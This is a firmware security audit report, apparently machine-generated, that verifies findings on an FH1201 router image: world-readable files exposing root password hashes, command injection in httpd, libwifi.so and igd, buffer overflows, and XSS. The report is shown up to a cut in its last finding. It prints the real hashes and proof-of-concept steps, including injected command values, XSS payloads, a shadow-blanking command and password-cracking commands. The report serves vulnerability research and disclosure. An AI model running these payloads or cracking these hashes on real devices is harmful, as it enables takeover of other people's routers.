# FH1201 - 验证报告 (15 个发现)

---

## 原始信息

- **文件/目录路径：** `var/etc/shadow`
- **位置：** `文件: shadow (完整路径: /etc/shadow)`
- **描述：** 在 '/etc/shadow' 文件中发现 root 用户的 MD5 密码哈希（$1$OVhtCyFa$7tISyKW1KGssHAQj1vI3i1），且文件权限设置为 777（-rwxrwxrwx），允许任何非 root 用户读取、写入和执行。具体表现：攻击者作为非 root 用户登录后，可直接访问该文件读取密码哈希。触发条件：攻击者拥有有效登录凭据（非 root 用户）并执行文件读取操作。约束条件和边界检查：文件缺少适当的访问控制，无权限验证。潜在攻击和利用方式：攻击者可以读取哈希后进行离线暴力破解（MD5 哈希易受攻击，尤其如果密码弱），成功后可获得 root 权限；或者直接修改文件内容（如清空 root 密码）以提升权限。相关代码逻辑或技术细节：文件为系统密码存储文件，通常应限制为 root 只读，但这里权限配置错误。
- **代码片段：**
  ```
  文件内容: root:$1$OVhtCyFa$7tISyKW1KGssHAQj1vI3i1:14319::::::
  ```
- **备注：** 此发现基于明确的文件内容和权限证据。攻击链完整：非 root 用户读取哈希 → 离线破解 → 获得 root 权限。MD5 哈希可能容易破解，但实际可利用性取决于密码强度；建议进一步验证密码复杂性或检查是否有其他保护机制（如哈希加盐）。关联文件：无其他直接关联，但可能影响系统认证组件。后续分析方向：检查其他敏感文件（如 passwd）的权限，或分析认证流程以确认漏洞影响范围。

## 验证结论

- **描述准确性：** `accurate`
- **是否为真实漏洞：** `True`
- **风险级别：** `High`
- **详细原因：** 警报描述完全准确。证据显示：1) 文件 'var/etc/shadow' 权限为 777（-rwxrwxrwx），允许任何非 root 用户读、写、执行；2) 文件内容包含 root 用户的 MD5 密码哈希（$1$OVhtCyFa$7tISyKW1KGssHAQj1vI3i1）。攻击者模型为已通过身份验证的非 root 用户。完整攻击链可重现：非 root 用户登录后，执行 'cat /etc/shadow' 读取哈希，然后使用工具（如 John the Ripper）离线破解 MD5 哈希（若密码弱，易成功），获得 root 权限；或直接执行 'echo "root::14319::::::" > /etc/shadow' 清空 root 密码，然后通过 'su root' 无需密码提升权限。无权限验证或边界检查，漏洞实际可利用且影响严重（获得系统完全控制）。

## 验证指标

- **验证时长：** 101.58 秒
- **Token 使用量：** 119089

---

## 原始信息

- **文件/目录路径：** `etc_ro/shadow`
- **位置：** `shadow:1 (file path)`
- **描述：** 发现 'shadow' 文件对所有用户可读（权限 777），包含 root 用户的 MD5 密码哈希（$1$OVhtCyFa$7tISyKW1KGssHAQj1vI3i1）。攻击者（非 root 用户）可以直接读取该文件，获取密码哈希，并通过离线破解（如使用工具如 John the Ripper）尝试获得 root 密码。一旦破解成功，攻击者可提升权限至 root，完全控制设备。触发条件简单：攻击者拥有有效登录凭据（非 root 用户）并可以访问文件系统。约束条件：密码强度影响破解难度，但 MD5 哈希相对脆弱，易于破解常见密码。潜在攻击方式包括直接文件读取和密码破解工具的使用。
- **代码片段：**
  ```
  File content: root:$1$OVhtCyFa$7tISyKW1KGssHAQj1vI3i1:14319::::::
  File permissions: -rwxrwxrwx
  ```
- **备注：** 此发现基于直接证据：文件可读且包含敏感哈希。建议进一步验证密码强度或检查其他相关文件（如 passwd）以确认完整攻击面。攻击链完整：从非 root 用户读取文件到潜在权限提升。

## 验证结论

- **描述准确性：** `accurate`
- **是否为真实漏洞：** `True`
- **风险级别：** `High`
- **详细原因：** 警报描述准确：文件权限为 777 允许任何用户（包括非 root 用户）读取；文件内容包含 root 用户的 MD5 密码哈希，证据来自 'ls -l etc_ro/shadow'（显示权限 -rwxrwxrwx）和 'cat etc_ro/shadow'（显示哈希值）。攻击者模型为已通过身份验证的本地非 root 用户，可利用此漏洞通过以下步骤实现权限提升：1. 作为非 root 用户登录系统；2. 执行 'cat /etc_ro/shadow' 读取文件，获取 root 的 MD5 哈希；3. 使用工具如 John the Ripper 进行离线破解（例如：命令 'john shadow'）；4. 若破解成功，使用获得的密码以 root 身份登录或执行特权命令。MD5 哈希相对脆弱，易于破解常见密码，导致完全设备控制。攻击链完整且可重现，无需额外条件。

## 验证指标

- **验证时长：** 113.28 秒
- **Token 使用量：** 130669

---

## 原始信息

- **文件/目录路径：** `bin/httpd`
- **位置：** `httpd:0x0046eefc sym.formexeCommand`
- **描述：** 在 `formexeCommand` 函数中，用户提供的 'cmdinput' HTTP 参数被直接用于构建系统命令，缺少输入验证和转义。攻击者可以注入 shell 元字符（如 ; & |）来执行任意命令。触发条件：攻击者发送 HTTP 请求到 `formexeCommand` 处理端点，提供包含恶意命令的 'cmdinput' 参数。约束条件：攻击者需要有效登录凭据，但无需 root 权限。潜在攻击包括权限提升、文件系统访问或网络侦察。代码逻辑比较用户输入与预定义命令（cd、ls、cat、echo、pwd、ping），如果不是预定义命令，则直接执行用户输入。
- **代码片段：**
  ```
  // 获取用户输入
  uVar1 = (**(iVar4 + -0x78cc))(*&uStackX_0,*(iVar4 + -0x7fd8) + -0x3bc,*(iVar4 + -0x7fd8) + -0x3b0); // websGetVar 获取 'cmdinput'
  (**(iVar4 + -0x71b0))(auStack_2308,uVar1); // 复制到缓冲区
  // 检查预定义命令后，对于非预定义命令：
  // str._s____tmp_cmdTmp.txt
  (**(iVar4 + -0x7860))(*(iVar4 + -0x7fd8) + -0x388,auStack_2308); // 构建命令字符串
  // 最终通过 doSystemCmd 执行
  ```
- **备注：** 漏洞利用链完整：从 HTTP 输入点 ('cmdinput') 到危险操作 (doSystemCmd)。httpd 通常以 root 权限运行，因此命令执行可能获得 root 权限。建议进一步验证 `formexeCommand` 的具体 URL 端点，但代码分析显示明确的漏洞模式。

## 验证结论

- **描述准确性：** `accurate`
- **是否为真实漏洞：** `True`
- **风险级别：** `High`
- **详细原因：** 警报描述准确。在 `formexeCommand` 函数中，用户提供的 'cmdinput' 参数通过 `websGetVar` 获取，使用 `strcpy` 复制到缓冲区，并直接用于构建系统命令字符串（如 `"%s > /tmp/cmdTmp.txt"`），最后通过 `doSystemCmd` 执行。代码缺少输入验证和转义，允许命令注入。攻击者模型：需要有效登录凭据的远程攻击者（无需 root 权限）。由于 httpd 通常以 root 权限运行，命令执行可能获得 root 权限，导致权限提升、文件系统访问或网络侦察。漏洞可利用性验证：输入可控（攻击者可通过 HTTP 请求控制 'cmdinput'），路径可达（对于非预定义命令直接执行，预定义命令也可能注入），实际影响严重。概念验证（PoC）：攻击者可发送 HTTP 请求到 `formexeCommand` 处理端点，提供 'cmdinput' 参数如 `"malicious; whoami"`，这将执行任意命令 `malicious; whoami > /tmp/cmdTmp.txt`。

## 验证指标

- **验证时长：** 121.27 秒
- **Token 使用量：** 167087

---

## 原始信息

- **文件/目录路径：** `lib/libwifi.so`
- **位置：** `libwifi.so:0x00022950 sym.wps_save`
- **描述：** The 'wps_save' function in 'libwifi.so' contains a command injection vulnerability due to unsanitized user input being passed directly to 'doSystemCmd'. The function takes three arguments (arg_c8h, arg_cch, arg_d0h), where 'arg_d0h' is used in formatted strings for 'doSystemCmd' calls without validation. An attacker can inject arbitrary commands by controlling 'arg_d0h', such as through semicolons or backticks, leading to command execution in the context of the process using this library. Trigger conditions include calling 'wps_save' with malicious 'arg_d0h', which could be achieved via network interfaces, IPC, or other components that invoke this function. The vulnerability allows full command execution, potentially leading to privilege escalation or system compromise if the process has elevated privileges.
- **代码片段：**
  ```
  0x00022950: lw a1, (arg_d0h)  ; Load user-controlled arg_d0h
  0x00022954: lw t9, -sym.imp.doSystemCmd(gp)  ; Load doSystemCmd function
  0x0002295c: jalr t9  ; Call doSystemCmd with format string 'nvram set %s_wps_mode=enabled' and a1
  Similar calls at 0x000229c8, 0x00022a24, etc., where arg_d0h is used in doSystemCmd without sanitization.
  ```
- **备注：** This vulnerability requires that 'wps_save' is callable with user-controlled input, which may be possible through web interfaces, API endpoints, or command-line tools. Further analysis is needed to identify specific call paths and interfaces that expose this function. The library is stripped, but exported functions are accessible. Assumes the attacking user has valid login credentials and can trigger the function call. Recommended to check for input validation in callers and implement sanitization of arguments passed to 'wps_save'.

## 验证结论

- **描述准确性：** `accurate`
- **是否为真实漏洞：** `True`
- **风险级别：** `High`
- **详细原因：** 安全警报准确描述了命令注入漏洞。证据来自 Radare2 反汇编：在地址 0x00022950、0x000229c8、0x00022a24 等处，arg_d0h 被直接加载到 a1 并传递给 doSystemCmd，用于格式化字符串如 'nvram set %s_wps_mode=enabled'，无任何输入消毒。攻击者模型为经过身份验证的用户（远程或本地），可通过网络接口、API 或命令行工具调用 wps_save 并控制 arg_d0h。完整攻击链验证：输入可控（arg_d0h 为参数）、路径可达（函数检查参数非零后执行）、实际影响（命令执行可能导致系统妥协）。PoC 载荷示例：调用 wps_save 时设置 arg_d0h 为 'wl0; touch /tmp/pwned #'，这将执行 'nvram set wl0; touch /tmp/pwned #_wps_mode=enabled'，其中分号注入命令 'touch /tmp/pwned'，并注释掉后续字符串。

## 验证指标

- **验证时长：** 151.33 秒
- **Token 使用量：** 215687

---

## 原始信息

- **文件/目录路径：** `usr/sbin/ufilter`
- **位置：** `ufilter:0x004042c0 fcn.004042c0, ufilter:0x00404450 fcn.00404450`
- **描述：** A buffer overflow vulnerability exists in the 'ufilter' binary within the URL and file type parsing functions. The vulnerability arises when processing command-line arguments for URL filtering, specifically in functions that handle comma-separated lists of URLs and file types. The functions fcn.004042c0 and fcn.00404450 use strcpy and memcpy to copy user-provided strings into a fixed-size buffer (64 bytes per entry, with up to 16 entries) without proper bounds checking. If an attacker provides a string longer than 64 bytes, it can overflow the buffer, potentially overwriting adjacent memory, including return addresses or function pointers. This can lead to arbitrary code execution or denial of service. The vulnerability is triggered when a non-root user executes 'ufilter' with the URL filter module and provides maliciously long URLs or file types via the 'set' command.
- **代码片段：**
  ```
  In fcn.004042c0:
  0x00404354      2000c58f       lw a1, (var_20h)  ; Load user input string
  0x00404358      bc81998f       lw t9, -sym.imp.strcpy(gp)  ; Call strcpy
  0x0040435c      00000000       nop
  0x00404360      09f82003       jalr t9  ; Execute strcpy without bounds check
  
  In fcn.00404450:
  0x004044e4      2000c58f       lw a1, (var_20h)  ; Load user input string
  0x004044e8      bc81998f       lw t9, -sym.imp.strcpy(gp)  ; Call strcpy
  0x004044ec      00000000       nop
  0x004044f0      09f82003       jalr t9  ; Execute strcpy without bounds check
  ```
- **备注：** The vulnerability is directly exploitable via command-line arguments, and the attack chain is verifiable through code analysis. However, actual exploitation may require specific conditions, such as the binary being executable by non-root users or having sufficient privileges. Further analysis could involve testing for privilege escalation if 'ufilter' runs with elevated permissions. The functions fcn.004042c0 and fcn.00404450 are called from sym.set_url, which handles URL filter settings. Additional input points like other filter modules (e.g., MAC filtering) should be investigated for similar issues.

## 验证结论

- **描述准确性：** `accurate`
- **是否为真实漏洞：** `True`
- **风险级别：** `High`
- **详细原因：** 安全警报准确描述了 ufilter 二进制文件中的缓冲区溢出漏洞。证据来自反汇编代码分析：函数 fcn.004042c0（地址 0x00404354-0x00404360）和 fcn.00404450（地址 0x004044e4-0x004044f0）使用 strcpy 将用户输入复制到固定大小的缓冲区（每个条目 64 字节，最多 16 个条目），没有边界检查。函数 sym.set_url（地址 0x00404704 和 0x00404750）调用这些易受攻击的函数，输入来自命令行参数（通过 sscanf 解析），证实了路径可达性。攻击者模型是非 root 用户通过命令行执行 ufilter 并传递恶意长字符串（例如，用于 URL 或文件类型过滤）。漏洞实际可利用，因为长于 64 字节的输入可溢出缓冲区，覆盖相邻内存（如返回地址），导致任意代码执行或拒绝服务。PoC 步骤：作为非 root 用户，运行 'ufilter set url "A"*65' 或类似命令，其中字符串超过 64 字节，即可触发缓冲区溢出。验证基于工具返回的反汇编代码，所有声明均有证据支持。

## 验证指标

- **验证时长：** 164.97 秒
- **Token 使用量：** 241283

---

## 原始信息

- **文件/目录路径：** `usr/lib/libupnp.so`
- **位置：** `libupnp.so:0x7700 sym.upnp_device_attach`
- **描述：** Stack-based buffer overflow in the sym.upnp_device_attach function due to use of strcpy without bounds checking. The function copies a string from UPnP device data (external input) to a fixed-size stack buffer (at sp+0xa0). When a crafted UPnP message contains a device string longer than 212 bytes, it overflows the buffer and overwrites the saved return address (at sp+0x174), enabling arbitrary code execution. Trigger condition: attacker sends a malicious UPnP device announcement or similar message. Exploitation requires the attacker to control the device string content and length to overwrite the return address with shellcode or ROP chain addresses.
- **代码片段：**
  ```
  0x000076f8      lw t9, -sym.imp.strcpy(gp)
  0x000076fc      addiu a1, s3, 4             ; source: device data string
  0x00007700      jalr t9                     ; call strcpy
  0x00007704      move a0, s5                ; destination: stack buffer at sp+0xa0
  ```
- **备注：** The stack buffer has a fixed size, and the distance to the return address is 212 bytes, making overflow straightforward. Assumes no stack protections (e.g., ASLR) are enabled in the firmware environment. Recommended to verify input source in upnp_ifattach and network handling functions. No other exploitable vulnerabilities found in strcpy/strcat usage after full analysis.

## 验证结论

- **描述准确性：** `accurate`
- **是否为真实漏洞：** `True`
- **风险级别：** `High`
- **详细原因：** The alert accurately describes a stack-based buffer overflow in sym.upnp_device_attach. The disassembly confirms strcpy is used at 0x7700 to copy from s3+4 (source, controllable via UPnP device data) to a fixed-size stack buffer at sp+0xa0 (destination). The buffer size is 212 bytes to the return address at sp+0x174, and no bounds checking is present. Under the attacker model of an unauthenticated remote attacker sending crafted UPnP messages (e.g., device announcements), the input is controllable, and the function is reachable via calls from upnp_ifattach. The overflow allows overwriting the return address, enabling arbitrary code execution. Exploitation requires a malicious UPnP message with a device string longer than 212 bytes, containing shellcode or ROP chain addresses. PoC steps: 1) Attacker crafts a UPnP message with a device string exceeding 212 bytes, embedding payload at the offset to overwrite the return address. 2) The message is sent to the target device. 3) Upon processing, strcpy overflows the buffer, hijacking control flow. This constitutes a full, exploitable chain with high risk due to remote code execution potential.

## 验证指标

- **验证时长：** 186.49 秒
- **Token 使用量：** 281175

---

## 原始信息

- **文件/目录路径：** `etc_ro/passwd`
- **位置：** `passwd`
- **描述：** The passwd file contains encrypted passwords for multiple default user accounts (admin, support, user, nobody) all with UID 0 (root privileges). This exposes a privilege escalation vulnerability: an attacker with non-root user credentials can read the passwd file (typically world-readable) and perform offline password cracking to obtain root access. The attack chain is: 1) Attacker logs in as a non-root user; 2) Attacker reads /etc/passwd; 3) Attacker extracts password hashes; 4) Attacker uses tools like John the Ripper to crack weak passwords; 5) If successful, attacker gains root privileges. Trigger conditions include weak or default passwords, and no shadow password protection. Potential exploitation involves brute-force or dictionary attacks on the hashes.
- **代码片段：**
  ```
  admin:6HgsSsJIEOc2U:0:0:Administrator:/:/bin/sh
  support:Ead09Ca6IhzZY:0:0:Technical Support:/:/bin/sh
  user:tGqcT.qjxbEik:0:0:Normal User:/:/bin/sh
  nobody:VBcCXSNG7zBAY:0:0:nobody for ftp:/:/bin/sh
  ```
- **备注：** The risk score is based on the complete attack chain and clear security impact (privilege escalation). Confidence is moderated as password strength is unverified; if passwords are default or weak, exploitation is highly likely. Recommend further analysis of password hashes for common defaults, checking for /etc/shadow file existence, and reviewing authentication mechanisms. This finding should be prioritized for password policy enforcement and shadow password implementation.

## 验证结论

- **描述准确性：** `accurate`
- **是否为真实漏洞：** `True`
- **风险级别：** `High`
- **详细原因：** 警报描述完全准确：etc_ro/passwd 文件包含多个默认用户（admin、support、user、nobody）的加密密码哈希，所有用户都有 UID 0（root 权限），且文件权限为世界可读（-rwxrwxrwx）。攻击者模型定义为：攻击者已获得本地非 root 用户 shell 访问（例如通过默认用户账户或先前漏洞）。完整攻击链验证：1) 攻击者以非 root 用户身份登录；2) 攻击者执行 'cat /etc/passwd'（在运行时，etc_ro/passwd 可能映射到 /etc/passwd）读取文件；3) 攻击者提取密码哈希（如 admin:6HgsSsJIEOc2U）；4) 攻击者使用工具如 John the Ripper 进行离线破解（例如命令：john --format=des passwd_hashes.txt）；5) 如果密码弱或默认（如常见默认密码），破解成功，攻击者使用获得的密码登录为 admin 或其他 root 用户，获得完整 root 权限。证据支持文件可读性和哈希存在，路径可达，实际影响为权限提升。因此，漏洞真实存在，风险高，建议强制密码策略和实现 shadow 密码。

## 验证指标

- **验证时长：** 198.55 秒
- **Token 使用量：** 295536

---

## 原始信息

- **文件/目录路径：** `webroot/js/gozila.js`
- **位置：** `gozila.js: ~line 650 (subForm 函数)`
- **描述：** 在 `subForm` 函数中存在 XSS 漏洞，由于 `genForm` 生成的 HTML 仅转义双引号字符，但未处理其他 HTML 特殊字符（如 `<`、`>`）。当攻击者控制配置值（通过表单输入）并注入恶意脚本时，`subForm` 函数使用 `innerHTML` 将未转义的 HTML 插入 DOM，导致脚本执行。触发条件：攻击者作为已登录用户修改表单字段值（例如通过浏览器开发者工具），并触发 `subForm` 调用（例如通过提交表单）。利用方式：注入 `<script>alert('XSS')</script>` 或类似负载，窃取会话 cookie 或执行管理操作。漏洞依赖于客户端验证绕过，但作为已登录用户，攻击者可直接操纵表单数据。
- **代码片段：**
  ```
  function subForm(f1, a, d, g) {
      var msg = genForm('OUT', a, d, g);
      /*DEMO*/
      if (!confirm(msg))
          return;
      /*END_DEMO*/
  
      var newElem = document.createElement("div");
      newElem.innerHTML = msg;
      f1.parentNode.appendChild(newElem);
      f = document.OUT;
      f.submit();
  }
  
  // 相关函数 genForm 和 frmAdd：
  function genForm(n, a, d, g) {
      frmHead(n, a, d, g);
      var sub = 0;
      for (var i = 0; i < CA.length; i++) {
          if (CA[i].v != CA[i].o) {
              frmAdd("SET" + sub, String(CA[i].i) + "=" + CA[i].v);
              sub++;
          }
      }
      if (frmExtraElm.length)
          OUTF += frmExtraElm;
      frmExtraElm = '';
      frmEnd();
      return OUTF;
  }
  
  function frmAdd(n, v) {
      set1 = "<input type=hidden name=" + n + " value=\"";
      v = v.replace(/\"/g, "&quot;");
      var r = new RegExp(set1 + ".*\n", "g");
      if (OUTF.search(r) >= 0)
          OUTF = OUTF.replace(r, (set1 + v + "\">\n"));
      else
          OUTF += (set1 + v + "\">\n");
  }
  ```
- **备注：** 此漏洞需要攻击者已获得登录凭据，但作为非 root 用户，可利用此漏洞提升权限或危害设备安全。建议进一步验证后端是否对输入进行额外过滤，并检查其他使用 `innerHTML` 的地方（如 `setpage` 和 `decodeSSID` 函数）。后续分析应关注表单提交的后端处理流程，以确认完整的攻击链。

## 验证结论

- **描述准确性：** `accurate`
- **是否为真实漏洞：** `True`
- **风险级别：** `Medium`
- **详细原因：** 安全警报准确描述了 XSS 漏洞。证据来自 webroot/js/gozila.js 文件：frmAdd 函数（行 506-513）只转义双引号，未处理 <、> 等字符；genForm 函数（行 516-528）使用 frmAdd 生成 HTML；subForm 函数（行 533-542）使用 innerHTML 插入未转义的 HTML。攻击者模型为已登录用户（非 root），他们可控制表单输入（如 CA[i].v）并触发 subForm 调用（例如通过表单提交）。漏洞可利用，因为恶意输入（如 <script>alert('XSS')</script>）在 innerHTML 解析时执行脚本。PoC 步骤：1. 以已登录用户身份访问相关表单页面；2. 修改表单字段值，注入 <script>alert('XSS')</script>；3. 触发 subForm 函数（如提交表单）；4. 脚本执行，证明漏洞存在。风险中等，因需身份验证，但可导致会话劫持或设备危害。

## 验证指标

- **验证时长：** 208.00 秒
- **Token 使用量：** 302579

---

## 原始信息

- **文件/目录路径：** `webroot/js/privatejs/wireless_extra.js`
- **位置：** `wireless_extra.js: wirelessScan函数 和 fillAcc函数`
- **描述：** XSS漏洞存在于无线网络扫描结果显示功能中。当用户执行无线扫描时，扫描结果中的SSID、MAC地址、信道等参数未经HTML转义直接通过innerHTML插入到DOM中。攻击者可以设置恶意SSID包含JavaScript代码，当已登录用户访问扫描页面并执行扫描时，XSS负载会自动执行。具体表现：1) 在wirelessScan函数中，扫描结果的SSID、MAC、信道等数据直接用于innerHTML；2) 在fillAcc函数中，SSID和其他参数同样未经转义直接插入。触发条件：攻击者广播恶意SSID，受害者使用设备的无线扫描功能。利用方式：注入的JavaScript可以窃取会话cookie、修改设备配置、重定向用户或执行其他恶意操作。
- **代码片段：**
  ```
  // 在wirelessScan函数中：
  nc=document.createElement('td');
  nr.appendChild(nc);
  nc.innerHTML = str[0];  // str[0]是SSID，直接插入
  nc.className = "td-fixed";
  nc.title = decodeSSID(str[0]);
  
  // 在fillAcc函数中：
  var ssid = siblings[0].innerHTML;  // 直接从DOM获取
  // ...
  $("#remoteSsid").val(ssid);  // 设置值，但之前已通过innerHTML插入
  // 多个innerHTML使用未转义数据
  ```
- **备注：** 这是一个反射型XSS漏洞，需要用户交互（执行扫描）。由于攻击者已拥有登录凭据，漏洞可被用于提升权限或持久化攻击。建议对所有用户输入进行HTML转义后再使用innerHTML。需要进一步验证后端是否对SSID长度和内容有过滤，但客户端缺乏转义是确定的。关联文件：可能影响其他使用扫描功能的页面。

## 验证结论

- **描述准确性：** `accurate`
- **是否为真实漏洞：** `True`
- **风险级别：** `High`
- **详细原因：** 安全警报准确描述了XSS漏洞。证据来自文件'webroot/js/privatejs/wireless_extra.js'：1) 在wirelessScan函数中，SSID(str[0])、MAC地址(str[1])、信道(str[2])等参数未经任何HTML转义直接通过innerHTML插入DOM表格；2) 在fillAcc函数中，SSID通过siblings[0].innerHTML从DOM获取并直接使用。攻击者模型：未经身份验证的远程攻击者可以广播恶意SSID，已登录用户访问无线扫描页面并执行扫描时触发XSS。漏洞可利用性验证：输入可控（SSID由攻击者任意设置）、路径可达（用户执行扫描操作是正常功能）、实际影响（XSS可窃取会话cookie、修改设备配置或重定向用户）。完整攻击链：攻击者设置恶意SSID（如'<script>alert(document.cookie)</script>'）→ 受害者扫描无线网络 → 扫描结果通过innerHTML插入DOM → XSS自动执行。概念验证（PoC）：攻击者配置SSID为'<img src=x onerror=alert(1)>'，受害者执行扫描后弹出警告框确认XSS执行。建议对所有用户输入进行HTML转义后再使用innerHTML。

## 验证指标

- **验证时长：** 231.81 秒
- **Token 使用量：** 317576

---

## 原始信息

- **文件/目录路径：** `etc_ro/passwd_private`
- **位置：** `文件: passwd_private`
- **描述：** 文件 'passwd_private' 包含 root 用户的密码哈希（MD5格式：$1$nalENqL8$jnRFwb1x5S.ygN.3nwTbG1），暴露了敏感认证信息。攻击者作为已登录非 root 用户可能能够读取此文件（由于类似 /etc/passwd 的文件通常对所有用户可读），提取哈希后使用离线工具（如 John the Ripper 或 Hashcat）进行破解。如果密码强度弱（例如常见密码），破解可能成功，使攻击者获得 root 密码并提升权限。触发条件是攻击者具有文件读取权限；缺少边界检查包括使用弱哈希算法（MD5 易受碰撞和彩虹表攻击）和可能不严格的文件权限设置。潜在攻击方式包括直接破解哈希后通过 su 或登录机制切换至 root 用户。
- **代码片段：**
  ```
  root:$1$nalENqL8$jnRFwb1x5S.ygN.3nwTbG1:0:0:root:/:/bin/sh
  ```
- **备注：** 证据基于文件内容分析；需要进一步验证文件权限（例如使用 'ls -l passwd_private' 确认非 root 用户读取权限）和密码实际强度（例如通过破解测试）。建议升级至更强哈希算法（如 bcrypt 或 SHA-512）并限制文件访问权限仅限 root 用户。此发现可能关联其他认证组件，如登录守护进程。

## 验证结论

- **描述准确性：** `accurate`
- **是否为真实漏洞：** `True`
- **风险级别：** `High`
- **详细原因：** 警报描述准确：文件 'etc_ro/passwd_private' 包含 root 用户的 MD5 密码哈希，且文件权限为 -rwxrwxrwx，允许任何已登录用户（包括非 root 用户）读取。攻击者模型为已登录非 root 用户（本地或远程），他们可以通过文件系统访问读取该文件。完整攻击链已验证：1) 攻击者读取文件（例如使用 'cat etc_ro/passwd_private'）；2) 提取哈希 '$1$nalENqL8$jnRFwb1x5S.ygN.3nwTbG1'；3) 使用离线工具（如 John the Ripper 或 Hashcat）破解 MD5 哈希（MD5 易受彩虹表或碰撞攻击，如果密码强度弱，破解可能成功）；4) 获得 root 密码后，通过 'su' 命令或登录机制提升权限。证据支持文件可读性和哈希存在，无需额外条件即可利用。因此，这是一个真实漏洞，风险级别为 High，因为它直接导致权限提升。PoC 步骤：作为非 root 用户，执行 'cat etc_ro/passwd_private' 获取哈希，然后使用破解工具（例如：echo '$1$nalENqL8$jnRFwb1x5S.ygN.3nwTbG1' > hash.txt && john hash.txt）进行破解，成功后使用 'su root' 并输入破解的密码切换至 root 用户。

## 验证指标

- **验证时长：** 133.13 秒
- **Token 使用量：** 167051

---

## 原始信息

- **文件/目录路径：** `etc_ro/shadow_private`
- **位置：** `shadow_private:1`
- **描述：** 文件 'shadow_private' 权限设置为 777，允许任何用户读取，其中包含 root 用户的密码哈希（MD5: $1$OVhtCyFa$7tISyKW1KGssHAQj1vI3i1）。攻击者（非root用户）可以轻松读取该文件，提取哈希，并使用离线工具（如 John the Ripper）进行密码破解。如果密码强度弱，攻击者可能获得 root 权限，实现权限提升。触发条件简单：攻击者只需执行读取命令（如 'cat shadow_private'）。约束条件包括密码的复杂性和破解工具的有效性，但权限配置错误使得攻击可行。
- **代码片段：**
  ```
  root:$1$OVhtCyFa$7tISyKW1KGssHAQj1vI3i1:14319::::::
  ```
- **备注：** 此漏洞源于错误的文件权限配置。建议立即修改文件权限为仅 root 可读（如 600），并检查系统是否使用此文件进行认证。后续可验证密码强度以评估实际风险，但当前证据表明攻击链完整。

## 验证结论

- **描述准确性：** `accurate`
- **是否为真实漏洞：** `True`
- **风险级别：** `High`
- **详细原因：** 警报描述完全准确：文件 'etc_ro/shadow_private' 权限为 777（证据：ls -l 显示 -rwxrwxrwx），内容包含 root 用户的 MD5 密码哈希（证据：cat 显示 root:$1$OVhtCyFa$7tISyKW1KGssHAQj1vI3i1:14319::::::）。攻击者模型为非 root 用户（本地或远程具有 shell 访问权限）。漏洞可利用性验证：输入可控（攻击者可执行读取命令如 'cat etc_ro/shadow_private'），路径可达（权限 777 允许任何用户读取），实际影响（提取哈希后，使用离线工具如 John the Ripper 破解弱密码，可能导致 root 权限提升）。完整攻击链 PoC：1. 攻击者执行 'cat etc_ro/shadow_private' 获取哈希；2. 保存哈希到文件（如 hash.txt）；3. 运行 'john --format=md5crypt hash.txt' 进行破解；4. 若密码弱，获得明文后使用 'su root' 或类似命令提升权限。风险高因涉及 root 权限提升。

## 验证指标

- **验证时长：** 153.87 秒
- **Token 使用量：** 220233

---

## 原始信息

- **文件/目录路径：** `usr/sbin/igd`
- **位置：** `igd:0x00402084 igd_osl_nat_config (函数入口), igd:0x0040226c (strcat 调用追加用户输入), igd:0x00402190 (_eval 调用执行命令)`
- **描述：** 在 'igd' 二进制文件中发现一个命令注入漏洞，允许攻击者通过 UPnP AddPortMapping 操作执行任意命令。漏洞源于 igd_osl_nat_config 函数在构建 'igdnat' 命令字符串时未对用户输入的 NewInternalClient 参数进行适当过滤。攻击者可以注入恶意命令分隔符（如分号或反引号）到 NewInternalClient 字段，导致 _eval 函数执行额外命令。触发条件包括：攻击者发送恶意的 UPnP 请求到 /control?WANIPConnection 端点，调用 AddPortMapping 操作并设置恶意的 NewInternalClient 值。利用方式例如设置 NewInternalClient 为 '127.0.0.1; malicious_command'，从而在设备上以服务权限（可能为 root）执行任意命令。
- **代码片段：**
  ```
  关键代码片段来自 igd_osl_nat_config 函数：
  - 0x004020f4: sprintf 构建基础命令 'igdnat -i %s -eport %d -iport %d -en %d'
  - 0x0040226c: strcat 追加 ' -client ' 和用户控制的 s1->1c 字段（NewInternalClient）
  - 0x00402190: _eval 执行最终命令字符串，输出重定向到 /dev/console
  完整命令示例：'igdnat -i eth0 -eport 80 -iport 8080 -en 1 -client 127.0.0.1; malicious_command'
  ```
- **备注：** 此漏洞需要攻击者能访问 UPnP 服务（通常监听局域网）。建议验证 _eval 函数的具体实现以确认命令执行行为。此外，igd_portmap_add 函数中多次使用 strcpy 可能存在缓冲区溢出，但命令注入攻击链更直接且易于利用。后续分析应关注其他 UPnP 操作（如 DeletePortMapping）是否也存在类似问题。

## 验证结论

- **描述准确性：** `partially`
- **是否为真实漏洞：** `True`
- **风险级别：** `High`
- **详细原因：** The alert is partially accurate due to an incorrect strcat address (0x0040226c instead of 0x004022d4 for appending NewInternalClient). However, the core command injection vulnerability is valid. Evidence from disassembly shows that igd_osl_nat_config function at 0x00402084 uses sprintf at 0x004020f4 to build a base command, and strcat at 0x004022d4 appends user-controlled input from s1 + 0x1c (NewInternalClient) without sanitization. The command is executed via _eval at 0x00402190, with output redirected to /dev/console. Attackers can control NewInternalClient in UPnP AddPortMapping requests sent to /control?WANIPConnection endpoint. The path is reachable when NewInternalClient is non-empty, and no input filtering is present. Exploitation example: Set NewInternalClient to '127.0.0.1; malicious_command' to execute arbitrary commands with service privileges (likely root). This constitutes a high-risk remote code execution vulnerability.

## 验证指标

- **验证时长：** 263.15 秒
- **Token 使用量：** 358330

---

## 原始信息

- **文件/目录路径：** `lib/modules/u_filter.ko`
- **位置：** `u_filter.ko:0x08004f68 sym.return_web_disable_page`
- **描述：** A buffer overflow vulnerability exists in the 'return_web_disable_page' function when generating HTTP redirect responses. The function uses 'sprintf' to format a response string that includes user-controlled URL data from network packets without proper length validation. Specifically, the format string 'HTTP/1.1 302 Moved Temporarily\r\nLocation: http://%s/disable.asp\r\nContent-Type: text/html; charset=iso-8859-1\r\nContent-length: %d\r\n\r\n%s' incorporates the user-provided URL via the '%s' specifier. The buffer 's2' (pointing to skb data) has limited size, and excessive input can overflow it, corrupting kernel heap memory. Attackers with network access can craft long URLs to trigger this overflow, potentially leading to code execution or denial-of-service. The vulnerability is triggered when a URL matches the filter criteria, causing 'url_filter' to call 'return_web_disable_page'.
- **代码片段：**
  ```
  0x08004f5c      0000053c       lui a1, $LC3                ; RELOC 32 $LC3 @ 0x080059b8
  0x08004f60      21306002       move a2, s3
  0x08004f64      21204002       move a0, s2
  0x08004f68      09f82002       jalr s1                      ; sprintf(s2, $LC3, s3, v0, s7)
  ; $LC3: "HTTP/1.1 302 Moved Temporarily\r\nLocation: http://%s/disable.asp\r\nContent-Type: text/html; charset=iso-8859-1\r\nContent-length: %d\r\n\r\n%s"
